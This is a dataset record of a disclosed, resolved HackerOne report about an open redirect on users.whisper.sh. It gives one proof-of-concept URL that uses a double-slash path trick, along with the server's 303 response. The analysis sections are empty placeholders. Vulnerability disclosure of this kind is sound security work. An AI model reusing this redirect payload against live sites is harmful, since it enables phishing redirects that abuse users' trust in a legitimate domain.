---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '261592'
original_report_id: '261592'
title: Open Redirection Found in users.whisper.sh
weakness: Open Redirect
team_handle: whisper
created_at: '2017-08-19T14:53:13.750Z'
disclosed_at: '2017-09-21T06:43:01.549Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- open-redirect
---

# Open Redirection Found in users.whisper.sh

## Metadata

- HackerOne Report ID: 261592
- Weakness: Open Redirect
- Program: whisper
- Disclosed At: 2017-09-21T06:43:01.549Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I found that one of your subdomains users.whisper.sh is vulnerable to open redirection.

POC: `http://users.whisper.sh//google.com/%2f..`

Response:
```
HTTP/1.1 303 See Other
X-Powered-By: Express
Location: //google.com/%2f../
Set-Cookie: 
CM; Path=/; HttpOnly
Date: Sat, 19 Aug 2017 14:22:50 GMT
Content-Length: 34
Via: 1.1 google

Redirecting to //google.com/%2f../
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
